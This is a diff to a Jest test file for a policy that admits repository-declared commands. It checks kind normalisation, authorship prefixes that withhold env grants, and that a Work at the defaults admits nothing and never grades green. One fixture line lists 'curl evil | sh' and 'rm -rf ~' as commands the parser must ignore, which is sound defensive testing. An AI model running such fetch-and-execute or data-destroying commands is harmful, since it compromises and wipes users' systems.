@@ -54,6 +54,22 @@ describe('parseRepoDeclaredCommands — an App spec (kind app)', () => {
         });
     });
 
+    it('recognises the App kind the way every other App Works path does (isAppWorkKind)', () => {
+        // `normalizeWorkKind` trims and lower-cases, so a padded or upper-case
+        // kind is still the App kind — in the parser AND in the admission.
+        expect(parseRepoDeclaredCommands(APP_SPEC, ' APP ')).toEqual(
+            parseRepoDeclaredCommands(APP_SPEC, 'app'),
+        );
+        expect(
+            admitRepoDeclaredCommands({
+                declared: parseRepoDeclaredCommands(APP_SPEC, 'App'),
+                policy: allowlist(),
+                mountDirs: [],
+                kind: 'App',
+            }).notAdmitted,
+        ).toHaveLength(2);
+    });
+
     it('reads spec.checks, never spec.tasks, for an App Work', () => {
         const spec = { ...APP_SPEC, tasks: { setup: ['curl evil | sh'], checks: ['rm -rf ~'] } };
         const parsed = parseRepoDeclaredCommands(spec, 'app');
@@ -282,14 +298,22 @@ describe('authorship — an App spec check cannot pose as an owner check (ACC-08
     });
 
     it('carries the authorship marker the node withholds run env grants on', () => {
-        // `withRunEnvGrants` (apps/node) withholds `envGrants` from every id with
-        // this prefix; an App spec check always has it, admitted or not.
-        expect(
-            [...admitted.checks, ...(admitted.notAdmitted ?? [])].every((check) =>
-                check.id.startsWith(REPO_DECLARED_COMMAND_ID_PREFIX),
-            ),
-        ).toBe(true);
-        expect(Object.keys(appCheck)).not.toContain('envGrants');
+        // `withRunEnvGrants` (apps/node) withholds the run's env grants from every
+        // id with this prefix; an App spec check always has it, admitted or not.
+        // The withholding itself is exercised through the REAL node executor, with
+        // exactly this pair (owner `type-check` beside App `repo/check-1` named
+        // `type-check`): `apps/node/src/core/executors/agent-task-phases.spec.ts`,
+        // "App Work checks on the node (APW-08 T13)".
+        const declaredAgain = admitRepoDeclaredCommands({
+            declared,
+            policy: allowlist(),
+            mountDirs: [],
+            kind: 'app',
+        });
+        for (const check of [...admitted.checks, ...(declaredAgain.notAdmitted ?? [])]) {
+            expect(check.id.startsWith(REPO_DECLARED_COMMAND_ID_PREFIX)).toBe(true);
+            expect(check.id).not.toBe(OWNER.id);
+        }
     });
 });
 
@@ -375,26 +399,51 @@ describe('TaskWorkspaceService.readFleetRepoDeclaredCommands — an App Work', (
         expect(verdict.gateStatus).toBe('red');
     });
 
-    it('an App Work left at the defaults yields no admitted checks and no green gate (ACC-08-41)', async () => {
-        // `checksPolicy` and `repoDeclaredCommands` exactly as a new row has them —
-        // T11's listener has NOT switched this Work on.
+    it('an App Work left at the defaults admits nothing, and nothing it plans can grade green (ACC-08-41)', async () => {
+        // The App spec in FILE declares a REQUIRED `type-check`. The Work is exactly
+        // as a new row has it — T11's listener has NOT switched it on.
         works = {
             findById: jest
                 .fn()
                 .mockResolvedValue(makeWork({ checksPolicy: 'off', repoDeclaredCommands: null })),
         };
-        const result = await read();
-        expect(result).toEqual({ setup: [], checks: [] });
-        // The file is not even read: a repository cannot make a Work do work.
+        const atDefaults = await read();
+        // Defaults admit nothing: no check is frozen for the node, and nothing is even
+        // reported not-admitted — the file is not read at all.
+        expect(atDefaults.checks).toEqual([]);
+        expect(atDefaults.setup).toEqual([]);
+        expect(atDefaults).not.toHaveProperty('notAdmitted');
         expect(gitFacade.getFileContent).not.toHaveBeenCalled();
-        // With nothing frozen the node runs no check and reports `none`, which
-        // the fold leaves alone — not green.
-        const verdict = foldNotAdmittedChecks(
-            { gateStatus: 'none', checks: [] },
-            result.notAdmitted,
-        );
-        expect(verdict.gateStatus).toBe('none');
-        expect(verdict.gateStatus).not.toBe('green');
+        // So the node is handed an EMPTY set, and the real executor reports `none`
+        // for one (apps/node agent-task-phases.spec.ts, "App Work checks on the
+        // node", ACC-08-41) — not green.
+
+        // The contrast, same file: once the switches are on (T11), the required
+        // check cannot be skipped by staying un-admitted. It comes back
+        // not-admitted, and a node that graded every check it was GIVEN green is
+        // folded to red.
+        works = {
+            findById: jest.fn().mockResolvedValue(
+                makeWork({
+                    checksPolicy: 'required',
+                    repoDeclaredCommands: { mode: 'allowlist', allow: ['pnpm e2e'] },
+                }),
+            ),
+        };
+        const switchedOn = await read();
+        expect(switchedOn.notAdmitted?.map((check) => [check.id, check.required])).toEqual([
+            ['repo/check-1', true],
+        ]);
+        const ranGreen = switchedOn.checks.map((check) => ({
+            id: check.id,
+            exitCode: 0,
+            status: 'green' as const,
+            durationMs: 1,
+        }));
+        expect(
+            foldNotAdmittedChecks({ gateStatus: 'green', checks: ranGreen }, switchedOn.notAdmitted)
+                .gateStatus,
+        ).toBe('red');
     });
 });
 
